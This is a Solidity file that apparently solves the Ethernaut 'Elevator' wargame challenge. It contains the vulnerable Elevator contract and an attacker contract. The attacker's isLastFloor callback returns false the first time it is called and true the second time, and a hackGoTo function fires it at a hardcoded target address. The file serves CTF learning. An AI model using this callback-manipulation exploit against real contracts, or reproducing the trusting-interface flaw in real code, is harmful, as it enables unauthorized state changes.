pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuidingImplementation is Building {
    
    address toHackAddress = 0x529b7ef7bd843b15cefae7c99eb8a246bb04e396;
    uint switchTrue;

    function BuidingImplementation() {
        switchTrue = 0;
    }
    
    function isLastFloor(uint _floor) view public returns (bool) {
        if (switchTrue == 1) {
            return true;
        }
        else {
            switchTrue = 1;
        }
        return false;
    }

    function hackGoTo(){
        Elevator elavator = Elevator(toHackAddress);
        elavator.goTo(1);
    }
    
}